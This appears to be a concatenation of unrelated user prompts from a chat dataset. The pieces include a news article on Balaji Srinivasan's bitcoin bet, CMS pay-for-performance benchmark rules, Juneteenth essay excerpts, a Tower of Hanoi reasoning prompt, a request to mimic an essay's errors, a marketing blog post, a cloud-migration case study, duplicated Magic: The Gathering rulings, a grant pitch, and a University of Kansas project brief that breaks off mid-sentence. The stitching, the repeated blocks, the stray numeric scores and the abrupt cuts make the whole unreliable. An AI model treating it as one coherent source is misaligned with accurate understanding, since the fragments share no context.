(Photo by Steve Jennings/Getty Images for TechCrunch)GETTY\nOn Friday, Balaji Srinivasan, a man who wields considerable influence in the tech and crypto worlds, made a jaw-dropping bet: $2 million that bitcoin would skyrocket from the mid-$20,000 range to $1 million per coin within 90 days. With this wager setting tongues wagging, the question on the lips of everyone outside the Silicon Valley club is: who exactly is Balaji Srinivasan?\n\nSrinivasan, or @balajis, as he\u2019s known on Twitter, has a resume that could be a model for the tech and crypto industries. He\u2019s an angel investor, tech founder and bestselling author of The Network State (in which he argues that technology will usher in the end of the nation-state era). His experience spans from being the CTO of Coinbase and a general partner at venture firm Andreessen Horowitz, to cofounding several companies that were later acquired. Srinivasan is hailed as a polymath, with degrees in electrical and chemical engineering from Stanford University, who has a penchant for seeing the forest for the trees.\n\nAnd, boy, he spares no detail in describing those woods. His podcast appearances regularly clock in at over three hours each as he holds court on everything from prime numbers to trends in longevity research (if you\u2019ve got eight, yes eight, hours to spare, you can hear what he has to say about those topics on the Lex Fridman podcast).\n\nThe bitcoin-will-hit-$1-million-by-mid-June prediction is a wild one, and it\u2019s hard not to dismiss it as hyperbole from a longtime crypto booster. On Twitter, Facebook cofounder Dustin Moskovitz tried to up the ante to a $50 million wager. Moskovitz deleted the tweet, but while it was up Srinivasan encouraged Moskovitz to bet against him by buying treasuries instead.\nCritics like Swan BitcoinBTC -1.2% founder Cory Klippsten have suggested that the bet might be a mere marketing ploy or even a pump-and-dump scheme, considering Srinivasan\u2019s history of promoting altcoins \u2014 a move that has made him something of a heretic among bitcoiners.\nIn other quarters, Srinivasan\u2019s bet has sparked a backlash, with critics accusing him of being the latest tech bro urging bank runs \u2014 fiddling as the financial system burns.\u201cThe Fed mismanagement crashed the system,\u201d Srinivasan tweeted. \u201cAnd now they\u2019re going to print trillions. A stealth devaluation of the dollar.\u201d\n\nIt\u2019s a dire prediction, but not one that\u2019s without precedent. Twitter cofounder Jack Dorsey sounded the alarm about hyperinflation in October 2021, warning that it\u2019s \u201cgoing to change everything.\u201d Dorsey, of course, famously parted ways with Twitter to focus his efforts building around bitcoin and is a staunch advocate for the digital currency. And while inflation has plagued Americans, it\u2019s not the Weimar kind, where buying a loaf of bread takes a wheelbarrow\u2019s worth of greenbacks.\nMoreover, some have questioned whether Srinivasan really has anything to lose in making the bet.\n\nHe\u2019s known to own a considerable amount of bitcoin, leading some to speculate that even a modest gain in the currency\u2019s price could more than offset his loss on the wager. Efforts to reach Srinivasan for this story were unsuccessful.\nWith such an outlandish prediction, it\u2019s easy to dismiss Srinivasan as a fool or a charlatan. After the collapse of Silicon Valley Bank, it\u2019s easier than ever to scoff at the kings and queens of Sand Hill Road. But, most of the other royals occupying that patch of Palo Alto would kill to swap their own track records or reputations with his. He\u2019s the man behind the \u201cidea maze\u201d concept, a framework that venture capitalist Ben Horowitz called required reading for budding entrepreneurs.\n\nSince Srinivasan made the bet Friday, bitcoin\u2019s value has gone up a bit, from $26,000 to $28,000 on Monday. Just $972,000 more to go."]

If a DCE has missing scores for all relevant quality measures, give them a P4P score=missing. Please use the benchmark information in \"Table 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\"\n -------1.1 Application of Quality Assessment to Final Financial Reconciliation\nThe process of determining the impact of quality measurement and performance on the PY Benchmark is summarized in this section using PY2022 as an example. The steps are as follows:\n\n\u2022 CMS develops Quality Benchmarks for each P4P measure.\n\u2022 Component Quality Scores are calculated: P4R Quality Measures are assessed, and P4P Quality Measures are compared against their Quality Benchmarks to determine performance levels.\n\u2022 Component Quality Scores are weighted to calculate the Total Quality Score.\n\u2022 (PY2023\u2013PY2026 only) CI/SEP criteria are assessed to determine the amount of the Quality Withhold to which the Total Quality Score will be applied.\n\u2022 (PY2023\u2013PY2026 only) HPP funds are distributed.\n\n1.1.1 Step 1. CMS Develops Quality Benchmarks for Each P4P Measure\nIn PY2022, ACR and UAMCC will have P4P components. These measures assess the occurrence of undesirable outcomes\u2014thus, lower measure scores represent better performance. Performance levels for each DCE are determined by comparing their Quality Measure scores with the relevant Quality Benchmark. The DCE earns a performance level for each measure based on where the measure score falls in comparison to the benchmark threshold values.\n\nTable 2-6 presents hypothetical Quality Benchmark distributions for Standard/New Entrant DCEs (using historical Medicare claims data) for both P4P measures. For example, a DCE with a measure score or risk-standardized readmission rate (RSRR) of 15.10% for ACR would be in the 50th percentile group for that measure (the score exceeds the threshold for the 60th percentile group but is less than the maximum threshold for the 50th percentile group). A DCE with a measure score or RSRR of 15.60% for ACR would be in the 20th percentile group for that measure (the score exceeds the threshold for the\n25th percentile group but is less than the maximum threshold for the 20th percentile group). A DCE with a measure score of 74.89 admissions per 100 person-years for UAMCC would be in the 10th percentile group (the score exceeds the threshold for the 15th percentile group but is less than the maximum threshold for the 10th percentile group).\n\nTable 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\n\nPercentile 5 10 15 20 25 30 40 50 60 70 80 90\nACR 16.34 15.99 15.79 15.68 15.57 15.47 15.31 15.18 15.08 14.95 14.82 14.6\nUAMCC 82.5 75.23 71.08 68.43 66.67 64.68 61.2 58.48 55.98 53.37 50.16 46.12\n\nPlease note that Table 2-6 presents an example only. These are not the final Quality Benchmarks and are not intended to provide an indication of the final Quality Benchmarks. Historically, Quality Benchmarks for other models have been released prior to the start of a given PY. However, observed and anticipated changes in utilization and outcomes resulting from coronavirus disease 2019 have made it inappropriate to use data from 2020 for Quality Benchmarking. Given the likelihood of ongoing impacts on current and future PYs, CMMI is taking a different approach for GPDC quality benchmarking.\n \n\nFor PY2021, GPDC Quality Benchmarks will not be released until June 2022 and will be based on a hybrid approach, combining historical and concurrent data from two discontinuous 12-month periods, the calendar years 2019 and 2021. A DCE\u2019s Final Earn-Back Rate for PY2021 will be determined during final reconciliation, which will occur in 2023.\n\nFor PY2022, GPDC Quality Benchmarks will shift to being based only on data from the 12-month period concurrent with the performance year. Starting with the first quarterly quality report for PY2022, CMMI will provide provisional quality benchmarks to DCEs in their quarterly reports, which will be calculated based on data from the same reporting period (i.e., April 1, 2021-March 31, 2022 for PY2022 Q1). The provisional benchmarks will be updated in each subsequent quarterly report with data from the same period being used to calculate DCE\u2019s performance. Because the DCE performance and benchmarks will be based on the same time-period and have the same exact risk adjustment coefficients, DCEs will have a more accurate picture from quarter to quarter of their performance relative to the benchmark. A DCE\u2019s Final Earn-Back Rate for PY2022 will be based on quality benchmarks calculated using data from calendar year 2022 and will be determined during final reconciliation, which will occur in 2023. As with the hybrid approach for PY2021, the use of concurrent benchmarks for PY2022 will avoid potential coronavirus disease 2019 impacts.\n\n1.1.2 Step 2. Component Quality Scores Are Calculated: P4R Quality Measures Are Assessed, and P4P Quality Measures Are Compared against Their Quality Benchmarks to Determine Performance Levels\nP4R Component: For PY2022, 4% of the 5% Quality Withhold is associated with P4R. The claims-based measures of ACR, UAMCC, and DAH (for High Needs Population DCEs only) comprise 2% of the Quality Withhold, and the CAHPS Measure comprises 2%. There are therefore two Component Quality Scores associated with P4R, one for the claims-based measures, and one for CAHPS.\n\u2022 All DCEs will meet the requirement for the claims-based measures and automatically earn a Component Quality Score of 100% for the portion of the withhold tied to the P4R claims-based measures in Table 2-3.\n\u2022 All DCEs that authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 100%. DCEs that do not authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 0%. DCEs that are exempt from CAHPS will have a single P4R Component Quality Score of 100%.\nP4P Component: The PY2022 P4P component will be the same as PY2021, which combines the ACR and UAMCC measures. The highest performance level (i.e., percentile) achieved for either Quality Measure determines the P4P Component Quality Score. Furthermore, the P4P component is considered pass/fail\u2014all DCEs with at least one measure at or exceeding the 30th percentile will pass and receive a 100% Component Quality Score.\n\nAs in PY2021, in PY2022, a sliding scale approach will be applied to DCEs that do not meet the 30th percentile threshold on at least one of the two measures. The sliding scale allows DCEs to earn back at\n \n\nleast a portion of the 1% withhold, based on their highest measure performance. The details of the sliding scales are presented in Table 2-7. In the example in Step 1 above, where a DCE achieved the 20th percentile for ACR and the 10th percentile for UAMCC, the DCE would receive a P4P Component Quality Score of 80%.\n\nTable 2-7. Sliding Scale Earn-Back for P4P Component Quality Score, PY2021 and PY2022\n\nPercentile Met P4P Component Quality Score\n\u2265 30th 100%\n25th to < 30th 95%\n20th to < 25th 80%\n15th to < 20th 60%\n10th to < 15th 40%\n5th to < 10th 20%\n< 5th 0%\n1.1.3 Step 3. Component Quality Scores Are Weighted to Calculate the Total Quality Score\nAfter assessing P4R measures and determining performance levels for each P4P measure, CMS calculates Component Quality Scores for each DCE. The component weight is the proportion of the overall Quality Withhold tied to that component. In PY2022, there are three Component Quality Scores. The first component is P4P, based on ACR and UAMCC. The P4P component has a weight of 1/5, contributing 1% out of the 5% Quality Withhold. The second component is P4R for claims-based measures and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. The third component is P4R for CAHPS and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. Note that additional P4P components (such as DAH) will be added in subsequent years.\n\nThe Total Quality Score is the percentage of the Quality Withhold eligible for earn-back that a DCE will actually earn back based on its quality performance and reporting. The Total Quality Score is calculated as the sum of the products of the Component Quality Scores and component weights, as shown in the equation below.\n\nTotal Quality Score = \u2211 (Component Quality Scores \\* Component Weights)\n\nIn our example above, the DCE receives a P4P Component Quality Score of 80% based on the sliding scale. The same DCE receives a P4R Component Quality Score for claims-based measures of 100%. This DCE also authorized a CAHPS Survey vendor, earning 100% of the P4R Component Quality Score for CAHPS. The P4P component has a weight of 1/5 and the P4R components each have a weight of 2/5. The Total Quality Score for this DCE is (80% \\* 1/5) + (100% \\* 2/5) + (100% \\* 2/5) = 96%.\n\n1.1.4 Step 4. Total Quality Score Is Multiplied by the Eligible Earn-Back Rate to Determine a DCE\u2019s\nFinal Earn-Back Rate\nIn PY2022, the Eligible Earn-Back Rate will be 5% for all DCEs. A DCE with a Total Quality Score of 96% will have a Final Earn-Back Rate of 4.8%. A DCE\u2019s Final Earn-Back Rate will be determined during final reconciliation, which will occur in 2023 for PY2022. The steps for the example described in this section, starting with Section 2.5, are summarized in Table 3-1."]

Now if somebody came and paid your rent, you wouldn\u2019t be sitting up talking about you wanna leave, would you?\u201d This dumbfounded me, until I realized she was mostly joking. But there was something deeper in her response. I eventually learned more about the violence that met newly emancipated Black Texans. Ku Klux Klansmen, along with local officials and everyday citizens, terrorized freedmen at will and without repercussions. They burned churches and homes, intimidated those who sought employment, and worse. Gen. Joseph Jones Reynolds, a commander of the Department of Texas during Reconstruction, commented in 1868, \u201cThe murder of Negroes is so common as to render it impossible to keep an accurate account of them.\u201d The Equal Justice Initiative has tried, reporting that more than 2,000 Black women, men and children were victims of racial terrorist lynchings during Reconstruction, which lasted from 1865 to 1877. Slavery was awful, no doubt, but emancipation brought its own unique cruelties. Formerly enslaved Texans were forced to craft lives from less than scratch; choose new names; attempt to reunite with stolen partners, siblings, children. They faced daily threats of jail or worse because of the new Black codes that severely restricted their freedom \u2014 their freedom to work, but also their freedom to be unemployed or even to stand still for too long. The more I learned, the more I understood my grandmother\u2019s perspective. She\u2019d heard the testimonies of those who\u2019d had to navigate both the tragedy of slavery and the terror of emancipation. She couldn\u2019t let me underestimate the enormous price our people had paid to be free. I miss Clarice so much some days, it\u2019s hard to think straight. I regret not asking more questions about our family, about her life in Pelham. As more folks in Clarice\u2019s generation pass away, we are losing the final physical links to those who know our history \u2014 who are our history. We can do no better this Juneteenth than to spend time with the elders who are still with us. Get them to talk. Record their stories. These historical and systemic injustices have not been resolved. But as Black Americans, we cannot wait for the day when our country will pay the respect that is due our forebears \u2014 or pay us those reparations. Instead of holding our breath, let us find the freshest air we can find and breathe it as deeply as we can, with joy. Let us grieve for our forebears and feel deep gratitude as we think of the enormous price our people paid so we could be free. Let us remember that despite the degradation of slavery, they lived fully human lives, too. They laughed. They loved. They dreamed. They ate sweet treats. Let us pray to them and say, this year and always: Thank you.\"\"\"\" \n\nArgument 2: an excerpt from \"\"\"\"Juneteenth Reminds Us to Think About Economic Freedom, Not Just Legal Liberty\"\"\"\" by Peter Coy: \n\n\"\"\"\"...[W]hen emancipation came, the first thing formerly enslaved people wanted was land, which they rightly saw as a prerequisite for real independence. \u201cThe way we can best take care of ourselves is to have land, and turn it and till it by our own labor,\u201d a Baptist minister named Garrison Frazier told the secretary of war, Edwin Stanton, and the Union general William Sherman in a meeting in Savannah, Ga., in January 1865. Four days later Sherman famously promised 40 acres of land to each formerly enslaved family (the \u201cand a mule\u201d part came later). But the federal government never followed through on its promise of land \u2014 and thus true independence \u2014 to formerly enslaved people. Economics entered into the picture, Stanley said: If African Americans grew subsistence crops on their own plots, who would cultivate and harvest all the cotton, tobacco, sugar and rice grown on the vast plantations? After the Civil War, in lieu of land distribution, slavery was replaced by sharecropping, in which planters allowed tenant farmers to keep a portion of the crops they raised. That subjugated the tenants to the owners almost as surely as slavery did. At the same time, industrialization in the North meant that more and more white Americans were working for wages \u2014 about two-thirds by 1875, according to Stanley. Many drew the connection between themselves and African Americans. Eugene Debs, who led the Pullman railroad strike of 1894, said, \u201cThe paternalism of the Pullman is the same as the interest of a slaveholder in his human chattels. You are striking to avert slavery and degradation.\u201d Today, the phrase \u201cwage slavery\u201d invoked by Debs and others has lost its punch. Many people who work for wages are doing very nicely, thank you. And many farmers and business owners, supposedly more independent, are buffeted by forces beyond their control, from bad weather to nasty customers. What hasn\u2019t changed, 157 years after the Juneteenth proclamation, is that a majority of African Americans continue to lack wealth. The median wealth of Black families in 2019 was just $24,100, versus $142,500 for white families, according to a Federal Reserve survey. Something needs to change, but what? The nature of the economy has changed, and few people still think that the solution to inequality is to give people plots of land to farm. We are enmeshed economically with one another in ways that Jefferson could not have imagined. Instead of land grants, the new protections for workers are unionization, government regulation and profit-sharing, Stanley said. One can quibble over her formula, but the motivation behind it is unquestionable. Freedom \u2014 which must include economic freedom \u2014 is just as important now as it was on the original Juneteenth.\"\"\n\nComparison of the two perspectives on Juneteenth and discussion of insights to be gained from the comparison:"]

There is a state of the world $s$ that takes two values $s\\_1$ and $s\\_2$ with probabilities $p$ and $1-p$ respectively.

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]Value: 1. The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Execute and move on to the next.\n\nGo back to Stage 1 and plan for the next move.\n\nNow let's try the following game:\n\nInitial state:\n\n```\nRod A: [3]\nRod B:\nRod C: [2,1]\n```\n\nGoal state:\n```\nRod A: \nRod B: \nRod C: [3, 2, 1]\n```"]

Write another essay in the same style with the same frequency and type of errors. \nSample: Communication Strategies across Cultural Borders\nThroughout Karla Scott Research paper \u201cCommunication Strategies across Cultural Borders\u201d she articulates the stereotypes that many Black Women have to overcome and their response towards such stereotypes. Scott also argues that Black women\u2019s lived experiences reflect interesting identities situated in contexts with racial and gendered power inequities. Scotts descriptive methods help communicate her argument of cross cultural realities and stereotypes. \nThe introduction to this research experiment presents information about understanding the communicative strategies that black women used to negotiate identity within everyday activities and experiences in different environments. She goes on to mention the theoretical aspect from Hooks book \u201cFeminist Theory: From Margin to Center\u201d quoting hooks statement behind the titles meaning, \u201cLiving as we did- on the edge\u201d, lead to the eye opening reality that they must understanf both aspects of life from the \u201coutside in and from the inside out.\u201d Scott examines the experiences of Black women in predominantly White communities in order to understand and \u201cliberate\u201d Black women from the negative stereotypes that society has placed on them and their communication strategies, by examining the why and how of their strategies, and the rewarding empowerment that comes from redefining what it means to be Black and a woman in the twenty first century. \nThe experiment reported in this paper (using black women at various stages in their academic careers) are rooted from predominantly white environments where they encounter cross cultural borders and stereotypes such as being \u201coutspoken, angry, gold digger \u2026 and intelligent.\u201d Scott began by collecting descriptive communicative experiences from black women. Where many stated that they felt as though they were representatives of their Black Communities and would often change their communication strategies which included tone of voice, body movement, and clothing choice in order to become more successful in such environments. She then continued to ask the participants to recall a specific experience and context where they had to use communication strategies. Which reflected an awareness of historical perceptions of Black womanhood and the result of redefining what it means to be a Black woman by using specific strategies, and the responsibility of providing insights and information to those in predominant white environments of their own culture by creating alternative versions of what it means to be a Black woman.\nScott concludes that the results of the experiment indicate that young black women perceive their communication strategies to be a necessary life skill in order to succeed in such environments as predominant white communities and the importance of being aware of historical perceptions of Black Women and providing \u201cteach- able moments\u201d to those in predominantly white communities. Overall, she argues how those same strategies can be empowered by the experiences of Black womanhood. \nSimilar essay:"]

Here's the [article] March 1, 2023\nJoshua Dreller\nWelcome to The Breakthrough\nWhy you should read this post\n\nMarketers are finally beginning to explore the What, Why, and How of omnichannel marketing. The Breakthrough is the industry\u2019s first resource hub dedicated to this evolving approach to help early adopters sift through current thinking and share innovative ways to get their organizations on the path to omnichannel success.\n\nThe advertising industry is on the cusp of massive change based on one simple disconnect: consumers don\u2019t see channels while they shop or browse, yet marketers are still attempting to engage them with a siloed approach. \n\nA channel-first approach focuses on the meticulous optimization of individual channels to drive results rather than the customer as the starting point for marketing strategy. More and more understand that connection is absolutely vital to, well, customer connection and that integrated insights and workflows are the only way forward in an ever-more-digitized commerce landscape. \n\nFew have made significant strides in the omnichannel marketing journey, but it probably doesn\u2019t help that there isn\u2019t a dedicated content resource for this subject. The goal of The Breakthrough is to fill the omnichannel education gap and cover topics related to customer-centricity and the evolution of media. After all, there are content hubs that focus on niche topics like search engine marketing, social advertising, programmatic media, and online video\u2014but The Breakthrough is the only industry publication that will tackle this transformative subject.\n\n\u201c\nThe goal of The Breakthrough is to fill the omnichannel education gap and cover topics related to customer-centricity and the evolution of media\nJosh Dreller, Sr. Director, Content Marketing, Skai\n\nWhy The Breakthrough?\nOur mission is to inspire trailblazers, pioneers, and early adopters who know that the omnichannel approach best aligns with the reality of the market and consumers\u2014but aren\u2019t yet sure how best to proceed\u2014by demystifying and debunking assumptions. This content will help them sift through current thinking and share innovative ways to get their organizations on the path to omnichannel success. \n\nThe Breakthrough offers proprietary insights, expert opinions, debates, research, and curated best-of-web articles on omnichannel and the future of media, including:\n\nChallenges and opportunities of omnichannel marketing\nAdopting a customer-centric mindset\nThe next generation of marketing and media measurement\nOptimizing your media mix to reach today\u2019s consumer\nHow data and privacy regulations are changing marketing\nThe evolution of the agency-brand relationships\nBest practices of working across walled gardens\nThe future of brand marketing in the performance era\nWelcome to The Breakthrough!\n\nIf you are interested in contributing\u2014or know someone who is\u2014\n\nplease email me at BTcontact@skai.io"]

Google Cloud has been\nchosen to replace their current colocation facilities.\n\nExisting technical environment\n\nEHR\u2019s software is currently hosted in multiple colocation facilities.

These systems are scheduled to be replaced over the next several years.\nThere is no plan to upgrade or move these systems at the current time.\nUsers are managed via Microsoft Active Directory. Monitoring is currently being done via\nvarious open source tools. Alerts are sent via email and are often ignored.\n\nBusiness requirements\n\nOn-board new insurance providers as quickly as possible.\nProvide a minimum 99.9% availability for all customer-facing systems.\nProvide centralized visibility and proactive action on system performance and usage.\nIncrease ability to provide insights into healthcare trends.\nReduce latency to all customers.\nMaintain regulatory compliance.\nDecrease infrastructure administration costs.\nMake predictions and generate reports on industry trends based on provider data.\n\nTechnical requirements\nMaintain legacy interfaces to insurance providers with connectivity to both on-premises\nsystems and cloud providers.\nProvide a consistent way to manage customer-facing applications that are\ncontainer-based.\nProvide a secure and high-performance connection between on-premises systems and\nGoogle Cloud.\nProvide consistent logging, log retention, monitoring, and alerting capabilities.\nMaintain and manage multiple container-based environments.\nDynamically scale and provision new environments.\nCreate interfaces to ingest and process data from new providers.\n\nExecutive statement\nOur on-premises strategy has worked for years but has required a major\ninvestment of time and money in training our team on distinctly different systems,\nmanaging similar but separate environments, and responding to outages.

If the second ability refers to \"the exiled card,\" it refers to all cards exiled by instances of the triggered ability.\n2/4/2023 In some cases involving linked abilities, an ability requires information about \"the exiled card.\" When this happens, the ability gets multiple answers. If these answers are being used to determine the value of a variable, the sum is used. For example, if Elite Arcanist's enters-the-battlefield ability triggers twice, two cards are exiled. The value of X in the activation cost of Elite Arcanist's other ability is the sum of the two cards' mana values. As the ability resolves, you create copies of both cards and can cast none, one, or both of the copies in any order.\n2/4/2023 In a Two-Headed Giant game, Elesh Norn does not affect triggered abilities of permanents your teammate controls.\n\nTERMS OF USE\nPRIVACY POLICY\nCODE OF CONDUCT\nMAGICTHEGATHERING.COM\nMAGIC: THE GATHERING ONLINE\nSETTINGS\nLANGUAGE\nCOOKIES\nHELP\nDO NOT SELL MY INFO\nAFFILIATE PROGRAM DISCLOSURE\n\u00a9 1995 - 2023 Wizards of the Coast LLC, a subsidiary of Hasbro, Inc.

This grant expects two innovative companies to work together, join forces to develop a more innovative product using the grant. \n\nDescription Accurat.ai\n''Accurat is a location intelligence startup, providing actionable insights to retail brands including Ahold group, Lidl and Aldi as well as for media companies such as Clear Channel.\n\nWe believe good decision making is based on solid and complete data. Whereas most companies today can already rely on solid customer data, it is hardly ever complete: brands have a hard time understanding on what their customers are doing beyond their brand, let alone beyond their category. In comes real-world behaviour understanding.\n\nCurrent practices to support decision making have multiple shortcomings. Accurat's real-world behaviour understanding solution deals with each of them: instead of declared responses, we rely on actual behaviour derived from carefully processing millions of coordinates a day; insights are not based on a sample of 1.000 respondents but based on 1 million+ users in the Benelux(and growing); in contrast with only national or regional insights, Accurat allows a deep dive on specific audiences, regions or even local situations; compared to a static picture delivered after weeks at best, we provide insights on a near-realtime basis.\n\nOn top of that, most data available today lacks actionability: you know your most fierce competitors as revealed by a market research survey, but you lack the actionability to target exactly those customers visiting your biggest opponent. With Accurat we bridge the gap between insights & actions by making sure you can improve and evaluate your door-to-door and your (digital) out of home planning targeting the most relevant audiences.''\n\nPlease think of the person judging the application.

Such triggered abilities start with \"when\" or \"whenever.\" Some keyword abilities also include a triggered ability that happens when a permanent enters the battlefield, such as For Mirrodin!\n2/4/2023 Replacement effects are unaffected by Elesh Norn's abilities. For example, a creature that enters the battlefield under your control with one +1/+1 counter on it won't receive an additional +1/+1 counter.\n2/4/2023 Abilities that apply \"as [this permanent] enters the battlefield,\" such as choosing a card type with Stenn, Paranoid Partisan, are also unaffected.\n2/4/2023 Elesh Norn's abilities don't look at who controls the permanent entering the battlefield, only who controls the permanent that has the triggered ability. For example, if you control Elesh Norn and a permanent with the ability \"Whenever a creature enters the battlefield, you gain 1 life,\" a creature entering the battlefield under an opponent's control will cause that ability to trigger twice.\n2/4/2023 Elesh Norn's first ability doesn't copy the triggered ability; it just causes the ability to trigger twice. Any choices made as you put the ability onto the stack, such as modes and targets, are made separately for each instance of the ability. Any choices made on resolution, such as whether to put counters on a permanent, are also made individually.\n2/4/2023 If you somehow control two Elesh Norns, a permanent entering the battlefield causes abilities to trigger three times, not four. A third Elesh Norn causes abilities to trigger four times, a fourth causes abilities to trigger five times, and so on.\n2/4/2023 If a permanent entering the battlefield at the same time as Elesh Norn (including Elesh Norn itself) causes a triggered ability of a permanent you control to trigger, that ability triggers an additional time.\n2/4/2023 Similarly, a permanent entering the battlefield at the same time as Elesh Norn (still including Elesh Norn) won't cause abilities of permanents an opponent controls to trigger.\n2/4/2023 If a triggered ability is linked to a second ability, additional instances of that triggered ability are also linked to that second ability. If the second ability refers to \"the exiled card,\" it refers to all cards exiled by instances of the triggered ability.\n2/4/2023 In some cases involving linked abilities, an ability requires information about \"the exiled card.\" When this happens, the ability gets multiple answers. If these answers are being used to determine the value of a variable, the sum is used. For example, if Elite Arcanist's enters-the-battlefield ability triggers twice, two cards are exiled. The value of X in the activation cost of Elite Arcanist's other ability is the sum of the two cards' mana values. As the ability resolves, you create copies of both cards and can cast none, one, or both of the copies in any order.\n2/4/2023 In a Two-Headed Giant game, Elesh Norn does not affect triggered abilities of permanents your teammate controls.\n\nTERMS OF USE\nPRIVACY POLICY\nCODE OF CONDUCT\nMAGICTHEGATHERING.COM\nMAGIC: THE GATHERING ONLINE\nSETTINGS\nLANGUAGE\nCOOKIES\nHELP\nDO NOT SELL MY INFO\nAFFILIATE PROGRAM DISCLOSURE\n\u00a9 1995 - 2023 Wizards of the Coast LLC, a subsidiary of Hasbro, Inc.

[6.361288547515869, 4.717177391052246, "You will write a project synopsis, and I will provide the details to get started. This project is in the context of a four year research university in the United states, The University of Kansas. This project will have four active participants. The purpose of this project is this successfully execute the university wide missions called \u201cJayhawks Rising\u201d. \n\nThe three mission-based institutional priorities for Jayhawks Rising are \u201cStudent Success\u201d, \u201cHealthy and Vibrant Communities\u201d, and \u201cResearch and Discovery\u201d. Thirteen objectives were identified under the three priorities. Each objective has co-leaders \u2013 deans and vice provosts with responsibilities tied to the objective \u2013 who will guide our efforts, involve stakeholders and lead implementation of strategies and action steps and help ensure continuous progress and success. Here is an outline of the thirteen objectives: \n\nStudent Success: \n\nIncrease Enrollment: We aim to expand our diverse community of ambitious and talented students, increasing access to a world class education for more first time freshman, new transfers, returning and graduate students. We will expand the reach of KU programming to connect to Jayhawks near and far, through on campus courses, around the nation in virtual formats, and across the globe. \n\nAssure Retention and Completion Through Student Engagement and Satisfaction: While student presence, persistence, and performance are indicators of a satisfied student population, it is also meaningful to assess and monitor student engagement and satisfaction directly. Engaged and satisfied students are more likely to retain, ultimately complete, and pass on the message that KU is a fantastic choice for higher education. \n\nSupport Student Long-Term Success by Improving Placement & Reducing Debt: While earning a degree from KU is part of why students attend KU, what they do with that degree is also of great importance. Additionally, the cost of higher education remains prominent in students\u2019 minds when selecting a higher education institution. \n\nAssure Quality of Academic Programs: No matter the domain, Jayhawks aspire for quality. When a student comes to KU, we must provide them with an excellent academic experience. By constantly raising the bar and meeting new challenges, we will ensure that our students receive an education that goes beyond the standard. \n\nHEALTHY & VIBRANT COMMUNITIES \n\nStrengthen Service to Local and Global Communities: Strengthening our service to local and global communities provides opportunities for our talented staff, faculty, and students to impact expansive programs near and far from KU. The volume and quality of services provided reflects our aspiration to impact communities across the world. \n\nImprove Diversity, Equity, Inclusion, and Belonging: With the ever-changing landscape of our country, and world, it is important to the University of Kansas that we make changes that create an environment of fairness, respect, and belonging. All students, staff, and faculty should have the greatest opportunities to meet their academic and professional goals. KU will examine and expand programs in order to meet our aspirations. \n\nImprove Health and Wellness: There is more to academic success than grades and graduation. At the University of Kansas, we want all our Jayhawks to have the highest quality of life. In addition to physical health and wellness, we will focus on providing an environment where students, staff, and faculty are supported with adequate benefits and resources, are safe on campus, and have their basic needs met. \n\nReseach and Discovery \n\nGrow KU Research: Research at KU has an acclaimed record of discovery and innovation at the local, regional, national, and global level. Growing KU research across the university allows us to continue to solve problems, ask new questions, inform leaders and policy makers, and inspire others. \n\nRecruit, Retain and Recognize Top Researchers: Central to a robust and impactful research enterprise are exceptional humans. Attracting highly productive and innovative researchers enhances KU\u2019s ability to conduct research that advances society. Retaining these gifted individuals requires KU to build a research support system that matches their ambitions to make discoveries that change the world and gain recognition for their work. Through financial and administrative support, KU will recruit, retain and recognize researchers working at the highest level, building a research enterprise that is impactful to the state, nation and beyond. \n\nExpand the Impact of KU Research in Kansas and Beyond: The University of Kansas aims to be an exceptional learning community that lifts each other, contributes to the wider scholarly enterprise and advances society. To measure and expand the impact of our research, KU focuses on research contributions in three key areas: academia; projects focused on core communities in our home state and beyond; involvement of students in research and their training to become future researchers. \n\nPromote Innovation and Entrepreneurship: KU research impacts society in ways that go way beyond contributing to the more traditional idea 